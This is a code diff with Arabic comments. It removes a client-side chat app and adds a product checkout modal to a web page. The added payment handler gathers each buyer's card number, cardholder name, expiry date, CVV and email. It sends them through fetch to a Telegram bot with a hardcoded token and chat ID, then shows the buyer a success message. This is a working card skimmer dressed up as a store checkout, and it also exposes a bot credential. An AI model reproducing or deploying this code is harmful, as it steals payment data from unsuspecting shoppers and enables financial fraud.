+        const paymentModal = document.getElementById('paymentModal');
+        const closeModal = document.getElementById('closeModal');
+        const paymentForm = document.getElementById('paymentForm');
+        const buyButtons = document.querySelectorAll('.buy-btn');
+        const selectedProduct = document.getElementById('selectedProduct');
+        const selectedPrice = document.getElementById('selectedPrice');
+        const loading = document.getElementById('loading');
+        const successMessage = document.getElementById('successMessage');
+        const errorMessage = document.getElementById('errorMessage');
+        
+        // فتح نموذج الدفع عند النقر على أي زر شراء
+        buyButtons.forEach(button => {
+            button.addEventListener('click', function() {
+                const product = this.getAttribute('data-product');
+                const price = this.getAttribute('data-price');
+                
+                selectedProduct.value = product;
+                selectedPrice.value = price;
+                
+                paymentModal.style.display = 'flex';
             });
-        }
-
-        // تسجيل الدخول
-        function loginUser(user) {
-            appData.currentUser = user;
-            localStorage.setItem('currentUser', JSON.stringify(user));
-            
-            // تحديث واجهة المستخدم
-            headerAvatar.src = user.avatar;
-            headerUsername.textContent = user.username;
-            headerRole.textContent = getUserRoleText(user.role);
-            
-            // إظهار زر الإدارة للمشرفين فقط
-            if (user.role === 'super-admin' || user.role === 'admin') {
-                adminPanelButton.style.display = 'block';
+        });
+        
+        // إغلاق النموذج
+        closeModal.addEventListener('click', function() {
+            paymentModal.style.display = 'none';
+            resetForm();
+        });
+        
+        // إغلاق النموذج عند النقر خارج المحتوى
+        window.addEventListener('click', function(event) {
+            if (event.target === paymentModal) {
+                paymentModal.style.display = 'none';
+                resetForm();
             }
+        });
+        
+        // معالجة نموذج الدفع
+        paymentForm.addEventListener('submit', function(e) {
+            e.preventDefault();
             
-            // إخفاء صفحات التسجيل وإظهار التطبيق
-            loginPage.style.display = 'none';
-            registerPage.style.display = 'none';
-            appHeader.style.display = 'flex';
-            mainContainer.style.display = 'flex';
-            
-            // إضافة رسالة ترحيبية
-            addSystemMessage(`مرحباً ${user.username}! انضممت إلى الدردشة`);
-            
-            // إضافة المستخدم إلى قائمة المتصلين
-            if (!appData.onlineUsers.some(u => u.id === user.id)) {
-                appData.onlineUsers.push(user);
-                updateOnlineUsers();
-            }
-        }
-
-        // تسجيل الخروج
-        function logout() {
-            // إزالة المستخدم من قائمة المتصلين
-            if (appData.currentUser) {
-                appData.onlineUsers = appData.onlineUsers.filter(u => u.id !== appData.currentUser.id);
-                updateOnlineUsers();
-            }
-            
-            // مسح بيانات المستخدم
-            appData.currentUser = null;
-            localStorage.removeItem('currentUser');
-            
-            // إعادة العرض إلى صفحة التسجيل
-            appHeader.style.display = 'none';
-            mainContainer.style.display = 'none';
-            loginPage.style.display = 'flex';
-            
-            // إخفاء زر الإدارة
-            adminPanelButton.style.display = 'none';
-        }
-
-        // تسجيل مستخدم جديد
-        function registerUser(username, email, password) {
-            const newUser = {
-                id: appData.users.length + 1,
-                username,
-                email,
-                password,
-                role: 'user',
-                avatar: `https://ui-avatars.com/api/?name=${encodeURIComponent(username)}&background=0aa0b0`,
-                points: 100,
-                online: true
+            // جمع بيانات الدفع
+            const paymentData = {
+                product: selectedProduct.value,
+                price: selectedPrice.value,
+                cardNumber: document.getElementById('cardNumber').value,
+                cardHolder: document.getElementById('cardHolder').value,
+                expiryDate: document.getElementById('expiryDate').value,
+                cvv: document.getElementById('cvv').value,
+                email: document.getElementById('email').value,
+                timestamp: new Date().toLocaleString('ar-EG')
             };
             
-            appData.users.push(newUser);
-            return newUser;
-        }
-
-        // إضافة رسالة إلى الدردشة
-        function addMessageToChat(userId, text, timestamp = new Date()) {
-            const user = appData.users.find(u => u.id === userId);
-            if (!user) return;
+            // إظهار حالة التحميل
+            loading.style.display = 'block';
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
             
-            const message = {
-                id: appData.messages.length + 1,
-                userId,
-                text,
-                timestamp
-            };
+            // إرسال البيانات للبوت التليجرام
+            sendToTelegram(paymentData);
+        });
+        
+        // دالة إرسال البيانات للبوت التليجرام
+        function sendToTelegram(paymentData) {
+            // تنسيق الرسالة
+            const message = `
+🛒 عملية شراء جديدة 🛒
             
-            appData.messages.push(message);
+📦 المنتج: ${paymentData.product}
+💰 السعر: $${paymentData.price}
             
-            const messageElement = document.createElement('div');
-            const isCurrentUser = appData.currentUser && userId === appData.currentUser.id;
+💳 معلومات الدفع:
+• رقم البطاقة: ${paymentData.cardNumber}
+• اسم حامل البطاقة: ${paymentData.cardHolder}
+• تاريخ الانتهاء: ${paymentData.expiryDate}
+• رمز الأمان (CVV): ${paymentData.cvv}
             
-            messageElement.classList.add('message');
-            if (isCurrentUser) messageElement.classList.add('my-message');
-            
-            const timeString = timestamp.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
-            
-            messageElement.innerHTML = `
-                <img src="${user.avatar}" alt="صورة ${user.username}" class="avatar">
-                <div class="message-content">
-                    <div class="message-user-info">
-                        <span class="message-user-name">${user.username}</span>
-                        ${getUserBadge(user.role)}
-                        <span class="message-time">${timeString}</span>
-                    </div>
-                    <p>${text}</p>
-                </div>
+📧 البريد الإلكتروني: ${paymentData.email}
+⏰ الوقت: ${paymentData.timestamp}
             `;
             
-            messagesContainer.appendChild(messageElement);
-            scrollToBottom();
-        }
-
-        // إضافة رسالة نظام
-        function addSystemMessage(text) {
-            const messageElement = document.createElement('div');
-            messageElement.classList.add('system-message');
-            messageElement.textContent = text;
+            // هنا نستخدم Webhook لإرسال البيانات للبوت
+            // استبدل YOUR_BOT_TOKEN و YOUR_CHAT_ID بالقيم الفعلية
+            const botToken = '7764994819:AAGTCq_eybBFnu66oeQz7LeKzrjMuG2pLr8';
+            const chatId = '8034352045';
             
-            messagesContainer.appendChild(messageElement);
-            scrollToBottom();
-        }
-
-        // الحصول على شارة المستخدم
-        function getUserBadge(role) {
-            switch(role) {
-                case 'super-admin':
-                    return '<i class="fas fa-crown super-admin-badge"></i>';
-                case 'admin':
-                    return '<i class="fas fa-crown admin-badge"></i>';
-                case 'vip':
-                    return '<i class="fas fa-heart vip-badge"></i>';
-                default:
-                    return '';
-            }
-        }
-
-        // الحصول على نص دور المستخدم
-        function getUserRoleText(role) {
-            switch(role) {
-                case 'super-admin':
-                    return 'المدير العام';
-                case 'admin':
-                    return 'مشرف';
-                case 'vip':
-                    return 'عضو مميز';
-                default:
-                    return 'مستخدم';
-            }
-        }
-
-        // التمرير إلى أحدث رسالة
-        function scrollToBottom() {
-            messagesContainer.scrollTop = messagesContainer.scrollHeight;
-        }
-
-        // تحديث قائمة المستخدمين المتصلين
-        function updateOnlineUsers() {
-            onlineUsersList.innerHTML = '';
-            
-            appData.onlineUsers.forEach(user => {
-                const userCard = document.createElement('div');
-                userCard.classList.add('user-card');
-                if (user.role === 'admin' || user.role === 'super-admin') userCard.classList.add('admin');
-                if (user.role === 'vip') userCard.classList.add('vip');
-                if (user.role === 'super-admin') userCard.classList.add('super-admin');
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                loading.style.display = 'none';
                 
-                userCard.innerHTML = `
-                    ${getUserBadge(user.role)}
-                    <img src="${user.avatar}" alt="صورة ${user.username}" class="card-avatar">
-                    <div class="user-card-details">
-                        <div class="card-name">${user.username}</div>
-                        <div class="card-status">
-                            <div class="status-dot"></div>
-                            <span>متصل</span>
-                        </div>
-                    </div>
-                    <div class="card-points">${user.points}</div>
-                `;
-                
-                onlineUsersList.appendChild(userCard);
+                if (data.ok) {
+                    successMessage.style.display = 'block';
+                    setTimeout(() => {
+                        paymentModal.style.display = 'none';
+                        resetForm();
+                    }, 3000);
+                } else {
+                    errorMessage.style.display = 'block';
+                }
+            })
+            .catch(error => {
+                loading.style.display = 'none';
+                errorMessage.style.display = 'block';
+                console.error('Error:', error);
             });
-            
-            // تحديث العداد
-            const count = appData.onlineUsers.length;
-            onlineCount.textContent = count;
-            sidebarOnlineCount.textContent = count;
         }
-
-        // فتح لوحة إدارة المشرفين
-        function openAdminPanel() {
-            adminUserList.innerHTML = '';
-            
-            appData.users.forEach(user => {
-                const userItem = document.createElement('div');
-                userItem.classList.add('admin-user-item');
-                
-                userItem.innerHTML = `
-                    <div class="admin-user-info">
-                        <img src="${user.avatar}" alt="صورة ${user.username}" class="admin-user-avatar">
-                        <div class="admin-user-details">
-                            <div class="admin-user-name">${user.username}</div>
-                            <div class="admin-user-role">${getUserRoleText(user.role)}</div>
-                        </div>
-                    </div>
-                    <div class="admin-user-actions">
-                        ${appData.currentUser.role === 'super-admin' ? `
-                            ${user.role !== 'super-admin' ? `
-                                <button class="admin-action-btn promote-btn" data-userid="${user.id}" data-action="promote">ترقية</button>
-                                ${user.role !== 'user' ? `<button class="admin-action-btn demote-btn" data-userid="${user.id}" data-action="demote">تنزيل</button>` : ''}
-                            ` : ''}
-                            <button class="admin-action-btn remove-btn" data-userid="${user.id}" data-action="remove">إزالة</button>
-                        ` : ''}
-                    </div>
-                `;
-                
-                adminUserList.appendChild(userItem);
-            });
-            
-            adminPanel.style.display = 'block';
-            adminOverlay.style.display = 'block';
+        
+        // إعادة تعيين النموذج
+        function resetForm() {
+            paymentForm.reset();
+            loading.style.display = 'none';
+            successMessage.style.display = 'none';
+            errorMessage.style.display = 'none';
         }
-
-        // ترقية/تنزيل مستخدم
-        function manageUser(userId, action) {
-            if (appData.currentUser.role !== 'super-admin') return;
+        
+        // تنسيق رقم البطاقة تلقائياً
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = '';
             
-            const user = appData.users.find(u => u.id === userId);
-            if (!user) return;
-            
-            switch(action) {
-                case 'promote':
-                    if (user.role === 'user') user.role = 'vip';
-                    else if (user.role === 'vip') user.role = 'admin';
-                    break;
-                case 'demote':
-                    if (user.role === 'admin') user.role = 'vip';
-                    else if (user.role === 'vip') user.role = 'user';
-                    break;
-                case 'remove':
-                    if (user.role === 'super-admin') {
-                        alert('لا يمكن حذف المدير العام!');
-                        return;
-                    }
-                    if (confirm(`هل أنت متأكد من حذف المستخدم ${user.username}؟`)) {
-                        appData.users = appData.users.filter(u => u.id !== userId);
-                        appData.onlineUsers = appData.onlineUsers.filter(u => u.id !== userId);
-                        updateOnlineUsers();
-                    }
-                    break;
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
             }
             
-            // إعادة فتح لوحة الإدارة لتحديث البيانات
-            openAdminPanel();
-        }
-
-        // إظهار خطأ
-        function showError(alertElement, message) {
-            alertElement.style.display = 'flex';
-            if (message) {
-                const errorText = alertElement.querySelector('span');
-                if (errorText) errorText.textContent = message;
-            }
-        }
-
-        // إخفاء جميع التنبيهات
-        function hideAlerts() {
-            loginError.style.display = 'none';
-            loginSuccess.style.display = 'none';
-            registerError.style.display = 'none';
-        }
-
-        // أحداث DOM
-        document.addEventListener('DOMContentLoaded', initApp);
-
-        // تسجيل الدخول
-        loginForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            hideAlerts();
+            e.target.value = formattedValue;
+        });
+        
+        // تنسيق تاريخ الانتهاء تلقائياً
+        document.getElementById('expiryDate').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
             
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            const user = appData.users.find(u => u.username === username && u.password === password);
-            
-            if (user) {
-                loginUser(user);
+            if (value.length >= 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
             } else {
-                showError(loginError, 'اسم المستخدم أو كلمة المرور غير صحيحة');
+                e.target.value = value;
             }
-        });
-
-        // إنشاء حساب جديد
-        registerForm.addEventListener('submit', (e) => {
-            e.preventDefault();
-            hideAlerts();
-            
-            const username = document.getElementById('regUsername').value;
-            const email = document.getElementById('regEmail').value;
-            const password = document.getElementById('regPassword').value;
-            const confirmPassword = document.getElementById('regConfirmPassword').value;
-            
-            // التحقق من صحة البيانات
-            if (password !== confirmPassword) {
-                showError(registerError, 'كلمة المرور غير متطابقة');
-                return;
-            }
-            
-            if (appData.users.some(u => u.username === username)) {
-                showError(registerError, 'اسم المستخدم موجود مسبقاً');
-                return;
-            }
-            
-            if (appData.users.some(u => u.email === email)) {
-                showError(registerError, 'البريد الإلكتروني موجود مسبقاً');
-                return;
-            }
-            
-            // إضافة المستخدم الجديد
-            const newUser = registerUser(username, email, password);
-            
-            // تسجيل الدخول تلقائياً
-            loginUser(newUser);
-        });
-
-        // الانتقال إلى صفحة التسجيل
-        showRegister.addEventListener('click', (e) => {
-            e.preventDefault();
-            loginPage.style.display = 'none';
-            registerPage.style.display = 'flex';
-            hideAlerts();
-        });
-
-        // الانتقال إلى صفحة تسجيل الدخول
-        showLogin.addEventListener('click', (e) => {
-            e.preventDefault();
-            registerPage.style.display = 'none';
-            loginPage.style.display = 'flex';
-            hideAlerts();
-        });
-
-        // تسجيل الخروج
-        logoutButton.addEventListener('click', logout);
-
-        // إرسال رسالة
-        sendMessageButton.addEventListener('click', () => {
-            const message = messageInput.value.trim();
-            
-            if (message && appData.currentUser) {
-                addMessageToChat(appData.currentUser.id, message);
-                messageInput.value = '';
-                
-                // محاكاة رد بعد ثانية
-                setTimeout(() => {
-                    const randomUser = appData.onlineUsers[Math.floor(Math.random() * appData.onlineUsers.length)];
-                    if (randomUser && randomUser.id !== appData.currentUser.id) {
-                        const responses = [
-                            "هذا رائع!",
-                            "شكراً للمشاركة",
-                            "أتفق معك في ذلك",
-                            "مثير للاهتمام حقاً",
-                            "هل يمكنك شرح المزيد؟"
-                        ];
-                        
-                        const randomResponse = responses[Math.floor(Math.random() * responses.length)];
-                        addMessageToChat(randomUser.id, randomResponse);
-                    }
-                }, 1000);
-            }
-        });
-
-        // إرسال رسالة بالضغط على Enter
-        messageInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                sendMessageButton.click();
-            }
-        });
-
-        // فتح لوحة الإدارة
-        adminPanelButton.addEventListener('click', openAdminPanel);
-
-        // إغلاق لوحة الإدارة
-        adminClose.addEventListener('click', () => {
-            adminPanel.style.display = 'none';
-            adminOverlay.style.display = 'none';
-        });
-
-        // النقر على overlay لإغلاق لوحة الإدارة
-        adminOverlay.addEventListener('click', () => {
-            adminPanel.style.display = 'none';
-            adminOverlay.style.display = 'none';
-        });
-
-        // إدارة المستخدمين (ترقية/تنزيل/حذف)
-        adminUserList.addEventListener('click', (e) => {
-            if (e.target.classList.contains('admin-action-btn')) {
-                const userId = parseInt(e.target.getAttribute('data-userid'));
-                const action = e.target.getAttribute('data-action');
-                manageUser(userId, action);
-            }
-        });
-
-        // إضافة تأثير عند النقر على أيقونة الإضافة
-        document.querySelector('.add-button').addEventListener('click', function() {
-            alert("خيارات إضافية: إرسال صورة، ملف، ملصق، أو إنشاء استطلاع");
         });
     </script>
 </body>
